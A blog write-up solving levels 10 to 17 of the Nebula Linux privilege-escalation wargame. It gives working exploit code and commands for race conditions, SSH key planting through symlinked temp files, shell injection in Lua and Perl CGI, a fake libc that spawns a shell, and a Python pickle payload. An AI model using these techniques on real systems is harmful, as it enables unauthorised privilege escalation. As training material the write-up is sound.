---
layout: post
title: "Exploit Education - Nebula: Write-up (Part 2)"
date: 2019-06-25 21:44:38.000000000 +8:00
excerpt: Write-ups for all the nebula challenges included in the VM created by exploit education. Nebula covers a variety of simple and intermediate challenges that cover Linux privilege escalation, common scripting language issues, and file system race conditions.
tags: 
  - exploit education
  - solution
  - nebula
keywords: [exploit education, nebula, solution, tip, answer, ctf]
category: 
  - exploit education
---

## Introduction

As the challenges are relatively short, I will be slowly updating this post will the ones I have completed. The VM can be obtained at [Exploit Education](https://exploit.education/nebula/), a website created by Andrew Griffiths that teaches common (and less than common) weaknesses and vulnerabilities in Linux.

The main purpose of each level is to bypass certain restrictions imposed by the system, and run `getflag` with the required privileges (pwn).

## Level10

Inspecting the home directory of `level10`, one may find a curious file names "x". Within the file, the password to the `flag10` account is stored. I assumed this was an unintended error as it would make this challenge boring. Thus, I ignored this file.

The home directory of `flag10` contains 2 files: a `token` file, which we do not have read permissions, and an executable with its source code provided online.

Inspecting the source code, the first thing I noticed was that the check by `access` is performed pre-maturely compared to the `open`. The timing difference is exaggerated by the `write` to a socket, which is known to take a long time. This increases the chance of a race condition, where we can abuse this delay to bypass the initial check. This is confirmed by the [man page for access](http://man7.org/linux/man-pages/man2/access.2.html), which specifies "...creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it."

In order to abuse the delay, we can swap the contents of the files we want to check. Initially, it may be a normal file, but it can be swapped to a symbolic link to the target file "token". This is done by the command `ln -fs /home/flag10/token foo.txt`. As the socket is created on port 18211, a keep-alive socket listener is required; it can be created by `netcat -kl 18211 &> out.txt &`. The last "&" indicates it runs in the background. To abuse the race condition, 2 terminals will be needed: one to repeatedly run the "flag10" executable by `while :; do /home/flag10/flag10 foo.txt 127.0.0.1; done`, and another to swap the original "foo.txt" to a symlink. We hope the timing is correct, and "out.txt" can be checked. If "out.txt" does not contain the required string, then the above process needs to be repeated.

Personally, I got the desired string - "615a2ce1-b2b5-4c76-8eed-8aa5c4015c27" - on my second try. 

## Level11

This level is rather interesting, as I suspect it is not performing as it is intended. Though I have devised a method that performs `getflag` successfully, it is rather convoluted compared to the most obvious method. That method does spawn a shell, but it has insufficient privileges.

The level provides the source code for a binary with the "setuid" bit on.

### Method 1

Inspecting the source code, it appears there is a `system` call within the `process` function. To trigger the `process` function, the first line of input must start with "Content-Length: xxxx", where "xxx" is a valid integer. Then, the integer is parsed, and an `if` function separates the program into 2 cases: one where the integer is smaller than 1024, and one where it is not. Interestingly, the case when the integer is smaller than 1024 only works when the integer is 1. This is indicated by the line `fread(buf, length, 1, stdin) != length`. `fread` returns the number of elements read. The size of each element is indicated by the second argument and the number of each element is limited by hte third argument. As the third argument is "1", the inequality will only hold true when the "length" is 1. With only 1 character under ur control, what I could have done is severely limited. Thus, I mainly focused on the second case.

The second case occurs when the inputted integer is larger or equal to 1024. In that case, a random file is generated by `getrand` and the program essentially reads "length" number of characters from the buffer. The characters are then processed by the `process` function and the message is executed by `system`.

Reversing the process/encryption is rather simple, as we can use the fact that (a ^ b) ^ b == a. As `k` changes after each character is processed, it is easy to reverse engineer it. After some math, the following python code was written to decrypt the code:

```python
def dc(b, l):
    a = ""
    k = l & 0xff
    for i in range(len(b)):
        a += chr((ord(b[i]) ^ k) & 0xff)
        k = (k - ord(b[i])) & 0xff
    return a
```

Thus, we can manipulate the information that goes into `system`. I intended to have an input of "getflag\00". The null terminator is required to finish the input. As a length of at least 1024 is required, the remaining bytes of the input can be padded by some junk character. This is summarised as follows:

```python
from __future__ import print_function
def p(*args):
    print(*args, end="")
cm = "getflag\x00"
print("Content-Length: %d" % (1024))
p(dc(cm, 1024))
for i in range(1024 - len(cm)):
    p("A")
```

Before executing, notice `getrand` requires and environmental variable "TEMP". This is often not set on the system, and I simply set it to "/tmp" by `export TEMP=/tmp`.

However, when it is executed, the program indicates we did not obtain the flag. Further inspection by `strace` reveals that the effective uid was reverted to the original just before the system call.

```bash
level11@nebula:~$ python py.py | /home/flag11/flag11
blue = 1024, length = 1024, pink = 1024
getflag is executing on a non-flag account, this doesn\'t count
level11@nebula:~$ python py.py | strace /home/flag11/flag11
...
getgid32()                              = 1012
setgid32(1012)                          = 0
getuid32()                              = 1012
setuid32(1012)                          = 0
...
```

I believe this is an unintended error, as this essentially blocks out all attacks that utilise `system`.

### Method 2

Fortunately, I have devised an alternative method. Observe the escalated permissions are only revoked just before the `system` call. Before that, another function that we can abuse is `write(fd, buf, pink)`. Through "fd" is determined by the random generator `getrand`, the file name that is generated can be estimated. It uses pid, which can be easily determined, and `time(NULL)`, whose resolution is only to hte nearest second. I can then create the predicted file beforehand, and symlink it to a file I want to overwrite (or create).

Now, I had to determine a target file to write. Looking around the home folder of "flag11", I found a ".ssh" folder. There are 2 ways to connect using SSH: using a password or using an authorised key. Coincidentally, the authorised keys are stored in the ".ssh" folder's "authorized_keys" files. Thus, if I can place the key of "level11" in the file, I can SSH into "flag11" without a password, and gain escalated privileges.

To generate a key for "level11", I used `ssh-keygen -t rsa` with default values. This creates a "id_rsa.pub" file, which contains the required keys. 

To predict the temporary filename, I use the fact that 2 executables that run consecutively have a pid difference of 1 and the first executable will execute in less than 1 second given the program is simple and the machine is fast. Using the above 2 facts, I created the following C file that pre-creates a file and symlinks it to "/home/flag11/.ssh/authorized_keys". Note that running this file will cause the executable to end pre-maturely as the required input length was not reached, but at this point the file contents have already been written so it does not matter. Replace `buffer` with whatever is in the "id_rsa.pub" file. In this case, encryption/processing is not needed as that is required for `system` only.

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>

int getrand(char **path, int pid, int time){
    int fd =  0;
    srandom(time);
    char *tmp = getenv("TEMP");
    asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
      'A' + (random() % 26), '0' + (random() % 10),
      'a' + (random() % 26), 'A' + (random() % 26),
      '0' + (random() % 10), 'a' + (random() % 26));
    return fd;
}

#define CL "Content-Length: "

int main(int argc, char **argv)
{
    char line[256];
    char buffer[10000] = "...";
    char *path;
    int pid = getpid()+1;
    getrand(&path, pid, time(NULL));
    symlink("/home/flag11/.ssh/authorized_keys",path);
    fprintf(stdout, "%s%d\n%s",CL,sizeof(buffer),buffer);
    return 0;
}
```

Using this method, I simply SSHed into flag11's account by `ssh flag11@127.0.0.1`, concluding this level.


## Level12

This is a simple problem. The lua script did not sanitise the input received, thus allowing arbitrary code execution during the step `io.popen("echo "..password.." | sha1sum", "r")`. To connect to the listening process, we can use `telnet hostname port`, which would be `telnet 127.0.0.1 50001` in this case. This allows a connection to the listening process. Then, we can design our input to suit the bash code above; I picked "a;getflag > /tmp/a.txt; echo a", which redirects the output of `getflag` to the file "/tmp/a.txt", allowing us to check the results of the code execution. This successfully obtains the flag, and the full process is described below:

```bash
level12@nebula:~$ telnet 127.0.0.1 50001
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Password: a; getflag > /tmp/a.txt; echo a
Better luck next time
Connection closed by foreign host.
level12@nebula:~$ cat /tmp/a.txt
You have successfully executed getflag on a target account
```

## Level13

The program is quite simple and rigid and there appears to be no problem with the binary itself. However, as we have control of the program environment as well, it is easy to manipulate the state of the binary. This can be done using a debugger, specifically gdb.

Using gdb, we are able to bypass the `if` statement and thus prevent the early exit of the program. I broke the program `main`, and printed the disassembled code. Using that, I determined the location of the `if` statement, and overwrote "eip" (instruction pointer) with the address the statement jumps to when `getuid()` is equal to 1000. This process is described below:

```
level13@nebula:~$ gdb /home/flag13/flag13
GNU gdb (Ubuntu/Linaro 7.3-0ubuntu2) 7.3-2011.08
Copyright (C) 2011 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/flag13/flag13...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x80484c9
(gdb) r
Starting program: /home/flag13/flag13

Breakpoint 1, 0x080484c9 in main ()
(gdb) x/29 main
   0x80484c4 <main>:    push   %ebp
   0x80484c5 <main+1>:  mov    %esp,%ebp
   0x80484c7 <main+3>:  push   %edi
   0x80484c8 <main+4>:  push   %ebx
=> 0x80484c9 <main+5>:  and    $0xfffffff0,%esp
   0x80484cc <main+8>:  sub    $0x130,%esp
   0x80484d2 <main+14>: mov    0xc(%ebp),%eax
   0x80484d5 <main+17>: mov    %eax,0x1c(%esp)
   0x80484d9 <main+21>: mov    0x10(%ebp),%eax
   0x80484dc <main+24>: mov    %eax,0x18(%esp)
   0x80484e0 <main+28>: mov    %gs:0x14,%eax
   0x80484e6 <main+34>: mov    %eax,0x12c(%esp)
   0x80484ed <main+41>: xor    %eax,%eax
   0x80484ef <main+43>: call   0x80483c0 <getuid@plt>
   0x80484f4 <main+48>: cmp    $0x3e8,%eax
   0x80484f9 <main+53>: je     0x8048531 <main+109>
   0x80484fb <main+55>: call   0x80483c0 <getuid@plt>
   0x8048500 <main+60>: mov    $0x80486d0,%edx
   0x8048505 <main+65>: movl   $0x3e8,0x8(%esp)
   0x804850d <main+73>: mov    %eax,0x4(%esp)
   0x8048511 <main+77>: mov    %edx,(%esp)
   0x8048514 <main+80>: call   0x80483a0 <printf@plt>
   0x8048519 <main+85>: movl   $0x804870c,(%esp)
   0x8048520 <main+92>: call   0x80483d0 <puts@plt>
   0x8048525 <main+97>: movl   $0x1,(%esp)
   0x804852c <main+104>:        call   0x80483f0 <exit@plt>
   0x8048531 <main+109>:        lea    0x2c(%esp),%eax
   0x8048535 <main+113>:        mov    %eax,%ebx
   0x8048537 <main+115>:        mov    $0x0,%eax
(gdb) break *0x80484f9
Breakpoint 2 at 0x80484f9
(gdb) c
Continuing.

Breakpoint 2, 0x080484f9 in main ()
(gdb) set $eip = 0x8048531
(gdb) c
Continuing.
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
[Inferior 1 (process 1637) exited with code 063]
```

Using the token, I am able to log into "flag13" and execute `getflag`.

## Level14

This level is rather trivial. The file "token" contains the string "857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.", which should be the result after applying the encryption from the executable. Playing around with the executable, you may notice the first character is always the same in both encrypted and unencrypted text. Furthermore, the second character always differs by 1. From this, I hypothesised that the executable increments the character by its position in the string. This is verified (to an extent) by the following:

```bash
level14@nebula:/home/flag14$ ./flag14 -e
aaaaaaaaaa
abcdefghij
```

From this point, we can create a python script that reverses the encryption. Running the following script results in "8457c118-887c-4e40-a5a6-33a25353165", which is the password for "flag14". We can then execute `getflag` successfully.

```py
s = "857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW."
for i in range(len(s)):
    print(chr(ord(s[i]) - i), end="")
```

## Level15

Following the hint, I ran `strace /home/flag15/flag15`, and the following results popped up:

```
level15@nebula:~$ strace /home/flag15/flag15
execve("/home/flag15/flag15", ["/home/flag15/flag15"], [/* 18 vars */]) = 0
brk(0)                                  = 0x859a000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7799000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/cmov", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/sse2/cmov", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/sse2", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/cmov", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/sse2/cmov", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/sse2", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/cmov", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2/cmov", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/cmov", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15", {st_mode=S_IFDIR|0775, st_size=40, ...}) = 0
open("/etc/ld.so.cache", O_RDONLY)      = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, ...}) = 0
mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7790000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0
mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xbf3000
mmap2(0xd69000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0xd69000
mmap2(0xd6c000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xd6c000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb778f000
set_thread_area({entry_number:-1 -> 6, base_addr:0xb778f8d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xd69000, 8192, PROT_READ)     = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0x32f000, 4096, PROT_READ)     = 0
munmap(0xb7790000, 33815)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7798000
write(1, "strace it!\n", 11strace it!
)            = 11
exit_group(11)                          = ?
```

The large group of `open` and `stat64` seems to be attempting to open a "libc.so.6" file; however, it cannot find any. Reading the description, it seems we need to create our own "libc.so.6" and place it in one of the directories. This way, we can control the function, and execute arbitary code. A possilbe libc function to replace is `__libc_start_main`, which is guarenteed to exist in all executables. This is confirmed by `objdump -r /home/flag15/flag15`. Thus, I created the file "/var/tmp/flag15/tmp.c" with the following content:

```c
int __libc_start_main(int *(main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)){
    system("/bin/sh");
}
```

However, when we compile it using the standard command `gcc -fPIC -shared -o libc.so.6 tmp.c`, we get the error "/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.0 not defined in file libc.so.6 with link time reference". The main problem appears to be lack of definition for `__cxa_finalize` , which is fixed by adding the following code to "/tmp":

```c
void __cxa_finalize(void * d){
    return;
}
```

Recompiling and excecuting, we obtain another relocation error, but for `system` this time. This is because `system` is a libc function, which is currently dynamically linked in. To statically link in the system, we modify the compiler command to `gcc -fPIC -shared -static-libgcc -Wl,-Bstatic -o libc.so.6 tmp.c`. `-Wl` specifies arguments for the linker.

This time, the error "Inconsistency detected by ld.so: dl-lookup.c: 169: check_match: Assertion 'version->filename == ((void *)0) || ! _dl_name_match_p (version->filename, map)' failed!" comes up. This is due to the lack of version specification of our library. To fix this, I created another file named "version", and added it to the linker arguments, so the compile command becomes `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic -o libc.so.6 tmp.c`. The file contains "GLIBC_2.0{};". For more about version, check out [here](http://sourceware.org/binutils/docs-2.18/ld/VERSION.html#VERSION).

Now, compiling and executing the executable spawns a shell. Its priveledges are checked by `whoami`. After realising the user is indeed "flag15", we can execute `getflag` successfully.

Don't forget to clean up by `rm /var/tmp/flag15/*` to revert the machine to the previous state.

## Level16

This is a rather simple level. Looking at the source code it can be easily spotted that there is an exploit in the line `egrep "^$username" /home/flag16/userdb.txt 2>&1`, as we basically have control over `$username`. `$username` is first preprocessed by converting all characters to uppercase and stripping all characters after a 0. However, both are only minor conviniences. I planned to set `$username` to a custom bash file that executes `getflag` and stores the output in a file. I was able to utilise the bash wildcard, the astrick, to specify the pathing, as long as the name of the bash file is correct. At the end, I ended up with the following code, stored in a file named "AAA" in the "/tmp" directory:

```bash
getflag > /tmp/output
```

`chmod` the script to allow execution. With that file, I was able to call the perl script with the username "\`/\*/AAA\`". As you can see, there are no spaces or lower case letters in the string, thus it will not be transformed. The backticks are required to allow execution of the inline bash before `egrep`. The string is converted to hexadecimal for URL purposes, resulting in "%60%2F%2A%2FAAA%60". The perl script is executed by `wget -O - "http://127.0.0.1:1616/index.cgi?username=%60%2F%2A%2FAAA%60"`. After this, inspect the file "/tmp/output", which should have the string "You have successfully executed getflag on a target account", indicating success.

## Level17

This level requires abusing security risks within python's `pickle` module. On python's official documentation [for `pickle`](https://docs.python.org/3/library/pickle.html), it is well documented it can run arbitary code. As the vulnerable python file is ran under the "flag17" account, we use it to achieve our desired effect. Further investigation online reveals that the `__reduce__` method of the pickled class is ran when loading the pickled data. Therefore, the goal is to dump a pickled object with a custom `__reduce__` method and send it to the desired port.

The code we want to run is `getflag`. As stdout is not displayed, we need to pipe it into a file. I selected a random file in "/tmp". The full python code is as follows:

```python
import socket
import os
import picke

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
skt.connect(('0.0.0.0', 10007))

class p(object):
    def __reduce__(self):
        return (os.system, ('getflag > /tmp/res.txt',))

skt.send(pickle.dumps(p()))
```

Run the above code using `python2`, and check the contents of the file "/tmp/t.txt". It should contain the desired output, indicating this level is solved.